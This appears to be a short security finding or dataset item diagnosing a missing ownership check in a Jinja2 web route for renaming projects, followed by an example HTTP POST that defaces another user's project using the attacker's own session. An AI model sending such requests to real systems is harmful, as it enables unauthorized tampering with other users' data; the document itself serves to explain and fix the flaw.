diagnosis: The Jinja2 route handles a form submission to rename a project. Although it confirms the session is active, it does not check project.owner_id == user.id. Any logged-in user can submit form data to alter project names and configurations belonging to other users.
exploit_request:
POST /portal/projects/288/settings HTTP/1.1
Host: portal.example.com
Cookie: session=attacker_cookie
Content-Type: application/x-www-form-urlencoded

project_name=Defaced+Project+Title
